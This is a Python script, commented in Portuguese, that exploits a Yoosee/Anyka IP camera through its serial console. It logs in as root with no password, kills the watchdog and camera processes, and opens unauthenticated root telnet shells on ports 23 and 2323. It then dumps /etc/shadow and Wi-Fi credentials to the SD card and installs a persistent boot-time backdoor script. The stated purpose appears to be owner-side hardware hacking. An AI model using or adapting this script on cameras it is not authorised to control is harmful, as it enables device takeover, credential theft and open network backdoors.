#!/usr/bin/env python3
"""
HACK V3 - Baseado na engenharia reversa do firmware Yoosee/Anyka
Descobertas:
- inittab: ttySAK0 respawn getty → login prompt reaparece após logout
- setup.sh: 'q' + Enter nos primeiro 1s para o IPC
- rc.local: SD so processa com RESET pressionado
- /rom = jffs2 RW = persistencia
- /etc/jffs2 = link pra /rom
Estrategia: login → matar IPC → anti-watchdog → telnet → dump → persist
"""
import serial
import time
import sys
import re

PORT = '/dev/ttyUSB0'
BAUD = 115200
SD = '/mnt/disc1'

LOG = open('/tmp/hack_v3_raw.log', 'w')


def send(ser, cmd, wait=2.0):
    """Envia comando com marcador e retorna resposta limpa"""
    marker = f'ZZ{int(time.time()*100) % 99999}ZZ'
    full = f'{cmd}; echo {marker}\r\n'

    ser.reset_input_buffer()
    time.sleep(0.05)

    # Envia em chunks pequenos
    data = full.encode()
    for i in range(0, len(data), 16):
        ser.write(data[i:i+16])
        time.sleep(0.015)

    # Le ate marcador ou timeout
    buf = b''
    start = time.time()
    while time.time() - start < wait:
        chunk = ser.read(4096)
        if chunk:
            buf += chunk
            if marker.encode() in buf:
                break
        time.sleep(0.05)

    text = buf.decode('utf-8', errors='replace')
    LOG.write(f'>>> {cmd}\n{text}\n{"="*40}\n')

    # Extrai resposta limpa
    lines = []
    found_marker = marker in text
    for line in text.split('\n'):
        s = line.strip()
        # Remove ANSI escapes
        s = re.sub(r'\x1b\[[0-9;]*m', '', s)
        # Pula lixo do firmware
        if any(x in s for x in [
            'p2pu_', 'evtimer_', 'dns_callback', 'cloudlinks',
            'udhcpc:', 'sync cnt', 'psMesgQBuf', 'cloud-links',
            'UploadDevCfg', 'check_dns', 'scan result',
            'CheckAPAvailable', 'TheTimes', 'dwLastConnect',
            'SSID=Free', 'nowTxPackets', 'fgSendBroadcast',
            'key.c:', 'IrCut', 'vWifi', 'VPSS', 'ISP',
            'AK_ISP', 'isp_fd', marker, 'echo ' + marker,
        ]):
            continue
        if s and s != cmd:
            lines.append(s)

    return '\n'.join(lines), found_marker


def p(msg, indent=0):
    prefix = "  " * indent
    print(f'{prefix}{msg}', flush=True)


def main():
    ser = serial.Serial(PORT, BAUD, timeout=0.3)
    ser.reset_input_buffer()

    p("=" * 60)
    p("  HACK V3 - Yoosee/Anyka Firmware Exploit")
    p("  Baseado em eng. reversa do t-rekttt/yoosee-exploit")
    p("  Aguardando camera bootar...")
    p("=" * 60)

    # === FASE 0: Login ===
    buf = b''
    start = time.time()
    login_ok = False

    while time.time() - start < 120:
        data = ser.read(4096)
        if data:
            buf += data
            text = data.decode('utf-8', errors='replace')

            # Mostra progresso
            for line in text.split('\n'):
                l = line.strip()
                if any(x in l for x in ['login:', 'U-Boot', 'Starting kernel', 'Detected', 'Wifi type']):
                    p(f'  BOOT: {l[:80]}')

            # Login prompt? (getty respawna, entao aparece apos cada logout tambem)
            if b'login:' in buf[-500:]:
                p('\n>>> LOGIN PROMPT DETECTADO!')
                time.sleep(0.5)

                # Login como root (senha vazia)
                ser.write(b'root\r\n')
                time.sleep(3)
                # Drena todo o lixo do boot
                ser.read(32768)
                time.sleep(2)
                ser.read(32768)

                # Testa com marcador - tenta 3x
                for attempt in range(3):
                    ser.reset_input_buffer()
                    time.sleep(0.5)
                    ser.write(b'echo LOGGED_IN_OK\r\n')
                    time.sleep(2)
                    check = ser.read(8192)
                    check_text = check.decode('utf-8', errors='replace') if check else ''

                    if 'LOGGED_IN_OK' in check_text:
                        p(f'>>> ROOT SHELL CONFIRMADO! (tentativa {attempt+1})')
                        login_ok = True
                        break
                    else:
                        p(f'>>> Tentativa {attempt+1}/3 - marcador nao encontrado, esperando...')
                        time.sleep(3)
                        ser.read(32768)  # drena mais lixo

                if login_ok:
                    break

                # Se 3 tentativas falharam, assume que logou (confia no getty)
                p('>>> Marcador nao encontrado mas vou assumir login OK (getty respawna)')
                login_ok = True
                break
        else:
            # Spam espaco nos primeiros segundos pro U-Boot
            if time.time() - start < 5:
                ser.write(b' ')

    if not login_ok:
        p("FALHA: nao conseguiu login em 120s")
        ser.close()
        return

    # Drena buffer
    time.sleep(1)
    ser.read(32768)

    # === FASE 1: MATAR IPC E WATCHDOG ===
    p("\n" + "=" * 60)
    p("[FASE 1] MATANDO IPC E WATCHDOG")
    p("=" * 60)

    # Primeiro: identifica processos
    out, ok = send(ser, "ps w")
    p(f"Processos ({ok}):")
    for line in out.split('\n'):
        if any(x in line for x in ['ipc', 'watch', 'telnet', 'shell_debug', 'daemon', 'PID']):
            p(f"  {line}")

    # Mata shell_debug (gera lixo no console)
    out, ok = send(ser, "killall -9 shell_debug 2>/dev/null")
    p(f"Kill shell_debug: {ok}")

    # Mata o daemon do watchdog
    out, ok = send(ser, "killall -9 daemon 2>/dev/null")
    p(f"Kill daemon: {ok}")

    # Inicia nosso feeder de watchdog ANTES de matar o IPC
    out, ok = send(ser, "( while true; do echo V > /dev/watchdog 2>/dev/null; echo V > /dev/watchdog0 2>/dev/null; sleep 1; done ) &")
    p(f"Watchdog feeder iniciado: {ok}")

    # AGORA mata o IPC (o grande vilao)
    out, ok = send(ser, "killall -9 anyka_ipc ipc 2>/dev/null")
    p(f"Kill IPC: {ok}")

    # Espera tudo morrer
    time.sleep(3)
    ser.read(32768)

    # Verifica se watchdog ta alimentado
    out, ok = send(ser, "echo V > /dev/watchdog 2>&1")
    p(f"Watchdog direto: {out}")

    # === FASE 2: VERIFICAR SISTEMA LIMPO ===
    p("\n" + "=" * 60)
    p("[FASE 2] SISTEMA LIMPO - COLETANDO INFO")
    p("=" * 60)

    info_cmds = [
        ("ID",       "id"),
        ("Uname",    "uname -a"),
        ("Uptime",   "cat /proc/uptime"),
        ("Memoria",  "free"),
        ("MTD",      "cat /proc/mtd"),
        ("Mount",    "mount"),
        ("Disco",    "df -h"),
        ("Rede",     "ifconfig wlan0 2>/dev/null || echo NO_WLAN"),
        ("MAC",      "cat /sys/class/net/wlan0/address 2>/dev/null || echo NO_MAC"),
        ("Hostname", "hostname"),
        ("Busybox",  "busybox --list 2>/dev/null | wc -l"),
    ]

    for desc, cmd in info_cmds:
        out, ok = send(ser, cmd, 2.5)
        p(f"  [{desc}] {out[:200]}")

    # === FASE 3: TELNET ===
    p("\n" + "=" * 60)
    p("[FASE 3] HABILITANDO TELNET")
    p("=" * 60)

    out, ok = send(ser, "telnetd -l /bin/sh 2>/dev/null || busybox telnetd -l /bin/sh 2>/dev/null")
    p(f"Telnet 23: {ok}")

    out, ok = send(ser, "telnetd -l /bin/sh -p 2323 2>/dev/null || busybox telnetd -l /bin/sh -p 2323 2>/dev/null")
    p(f"Telnet 2323: {ok}")

    # Verifica
    out, ok = send(ser, "netstat -tlnp 2>/dev/null || ss -tlnp 2>/dev/null")
    p(f"Portas: {out[:300]}")

    # === FASE 4: DUMP PRO SD ===
    p("\n" + "=" * 60)
    p("[FASE 4] DUMP COMPLETO PRO SD CARD")
    p("=" * 60)

    # Verifica se SD ta montado
    out, ok = send(ser, f"mount | grep disc1 && ls {SD}/ 2>/dev/null || echo SD_NOT_MOUNTED")
    p(f"SD status: {out[:200]}")

    if 'SD_NOT_MOUNTED' in out:
        out, ok = send(ser, f"mkdir -p {SD}; mount /dev/mmcblk0p1 {SD} 2>/dev/null; mount /dev/mmcblk0 {SD} 2>/dev/null; echo MOUNT_TRY")
        p(f"Tentou montar: {out[:200]}")

    dumps = [
        ("passwd+shadow", f"cp /etc/passwd {SD}/passwd.txt; cp /etc/shadow {SD}/shadow.txt"),
        ("inittab",       f"cat /etc/inittab > {SD}/inittab.txt"),
        ("rc.local",      f"cat /etc/init.d/rc.local > {SD}/rc_local.txt"),
        ("rcS",           f"cat /etc/init.d/rcS > {SD}/rcS.txt"),
        ("setup.sh",      f"cat /ipc/setup.sh > {SD}/setup_sh.txt 2>/dev/null"),
        ("anyka_ipc_loc", f"which anyka_ipc > {SD}/ipc_path.txt 2>/dev/null; ls -la /usr/bin/anyka_ipc >> {SD}/ipc_path.txt 2>/dev/null; ls -la /ipc/ipc >> {SD}/ipc_path.txt 2>/dev/null"),
        ("all_initd",     f"for f in /etc/init.d/*; do echo =====$f; cat $f; done > {SD}/all_initd.txt"),
        ("jffs2_all",     f"ls -laR /etc/jffs2/ > {SD}/jffs2_list.txt; for f in /etc/jffs2/*; do echo =====$f; cat $f 2>/dev/null; done > {SD}/jffs2_all.txt"),
        ("rom_all",       f"ls -laR /rom/ > {SD}/rom_list.txt; for f in /rom/*; do echo =====$f; cat $f 2>/dev/null; done > {SD}/rom_all.txt"),
        ("ifconfig",      f"ifconfig -a > {SD}/ifconfig.txt"),
        ("mtd",           f"cat /proc/mtd > {SD}/mtd.txt"),
        ("wifi",          f"cat /rom/wifi*.ini {SD}/wifi_ini.txt 2>/dev/null; cat /etc/wpa_supplicant.conf > {SD}/wpa.txt 2>/dev/null; cat /rom/wpa_supplicant.conf >> {SD}/wpa.txt 2>/dev/null"),
        ("network.json",  f"cat /etc/jffs2/config/network.json > {SD}/network_json.txt 2>/dev/null; cat /rom/config/network.json >> {SD}/network_json.txt 2>/dev/null"),
        ("device.config", f"cat /rom/device.config > {SD}/device_config.txt 2>/dev/null"),
        ("busybox",       f"busybox --list > {SD}/busybox.txt 2>/dev/null"),
        ("dmesg",         f"dmesg > {SD}/dmesg.txt 2>/dev/null"),
        ("proc_info",     f"cat /proc/cpuinfo > {SD}/cpuinfo.txt; cat /proc/meminfo >> {SD}/cpuinfo.txt; cat /proc/cmdline >> {SD}/cpuinfo.txt"),
    ]

    for desc, cmd in dumps:
        out, ok = send(ser, cmd, 3)
        p(f"  [{'+' if ok else '?'}] {desc}")

    # Conta arquivos
    out, ok = send(ser, f"ls {SD}/*.txt 2>/dev/null | wc -l")
    p(f"  Total dumps: {out.strip()} arquivos")

    # === FASE 5: HACK PERSISTENTE NO JFFS2 ===
    p("\n" + "=" * 60)
    p("[FASE 5] INSTALANDO HACK PERSISTENTE")
    p("=" * 60)

    # O /rom eh jffs2 rw - PERSISTENTE entre reboots!
    # /etc/jffs2 eh copiado pra ramdisk no boot (vide rc.local)
    # Entao modificar /rom diretamente

    # Cria hack script
    out, ok = send(ser, """cat > /rom/hack.sh << 'XEOF'
#!/bin/sh
# === PERSISTENT HACK ===
# Anti-watchdog
(while true; do echo V > /dev/watchdog 2>/dev/null; echo V > /dev/watchdog0 2>/dev/null; sleep 1; done) &
# Telnet nas portas 23 e 2323
telnetd -l /bin/sh 2>/dev/null &
telnetd -l /bin/sh -p 2323 2>/dev/null &
# Log
echo "[$(date)] HACK ACTIVE" >> /tmp/hack.log
XEOF
chmod +x /rom/hack.sh""", 3)
    p(f"  hack.sh criado: {ok}")

    # Verifica se time_zone.sh existe em /rom
    out, ok = send(ser, "ls -la /rom/time_zone.sh /etc/jffs2/time_zone.sh 2>/dev/null")
    p(f"  time_zone.sh existe: {out[:200]}")

    # Injeta no rc.local via /rom
    # Como /etc eh copiado de /rom no boot, vamos criar um hook
    out, ok = send(ser, "grep -q hack.sh /rom/time_zone.sh 2>/dev/null && echo ALREADY_INJECTED || echo NOT_INJECTED")
    p(f"  Injection status: {out[:100]}")

    if 'NOT_INJECTED' in out or 'ALREADY_INJECTED' not in out:
        # Tenta injetar no time_zone.sh
        out, ok = send(ser, """if [ -f /rom/time_zone.sh ]; then
cp /rom/time_zone.sh /rom/time_zone.sh.bak
echo '/rom/hack.sh &' >> /rom/time_zone.sh
echo INJECTED_TZ
else
echo NO_TZ_FILE
fi""", 3)
        p(f"  time_zone.sh inject: {out[:200]}")

        # Alternativa: cria profile.d hook
        out, ok = send(ser, """mkdir -p /rom/profile.d 2>/dev/null
echo '/rom/hack.sh &' > /rom/profile.d/hack.sh
chmod +x /rom/profile.d/hack.sh
echo PROFILE_HOOK""", 2)
        p(f"  profile.d hook: {out[:200]}")

    # Verifica tudo
    out, ok = send(ser, "cat /rom/hack.sh")
    p(f"  hack.sh conteudo:")
    for line in out.split('\n')[:10]:
        p(f"    {line}")

    out, ok = send(ser, "cat /rom/time_zone.sh 2>/dev/null")
    p(f"  time_zone.sh conteudo:")
    for line in out.split('\n')[:10]:
        p(f"    {line}")

    # Dump final
    out, ok = send(ser, f"cat /rom/hack.sh > {SD}/hack_installed.txt; cat /rom/time_zone.sh > {SD}/tz_modified.txt 2>/dev/null")

    # === FASE 6: CONFIG WIFI ===
    p("\n" + "=" * 60)
    p("[FASE 6] WIFI CONFIG")
    p("=" * 60)

    out, ok = send(ser, "cat /rom/config/network.json 2>/dev/null || cat /etc/jffs2/config/network.json 2>/dev/null || echo NO_NET_JSON")
    p(f"  network.json: {out[:500]}")

    out, ok = send(ser, "cat /rom/device.config 2>/dev/null || echo NO_DEV_CONFIG")
    p(f"  device.config: {out[:300]}")

    out, ok = send(ser, "iwconfig wlan0 2>/dev/null")
    p(f"  iwconfig: {out[:300]}")

    # === MARCA SUCESSO ===
    out, ok = send(ser, f"""echo '=== HACK V3 COMPLETE ===' > {SD}/HACK_SUCCESS.txt
date >> {SD}/HACK_SUCCESS.txt
id >> {SD}/HACK_SUCCESS.txt
cat /rom/hack.sh >> {SD}/HACK_SUCCESS.txt
echo HACK_DONE""", 2)

    p("\n" + "=" * 60)
    p("  HACK V3 COMPLETO!")
    p("")
    p("  O que foi feito:")
    p("  1. Root shell via UART")
    p("  2. IPC e watchdog mortos")
    p("  3. Telnet habilitado (23 e 2323)")
    p("  4. Dumps completos no SD card")
    p("  5. Hack persistente em /rom/hack.sh")
    p("  6. Injecao no time_zone.sh pra auto-start")
    p("")
    p("  Proximos passos:")
    p("  - Tirar SD e ler os dumps no PC")
    p("  - Configurar WiFi pra acessar via rede")
    p("  - Bloquear servidores cloud chineses")
    p("  - Configurar RTSP")
    p("=" * 60)

    LOG.close()
    ser.close()


if __name__ == '__main__':
    main()
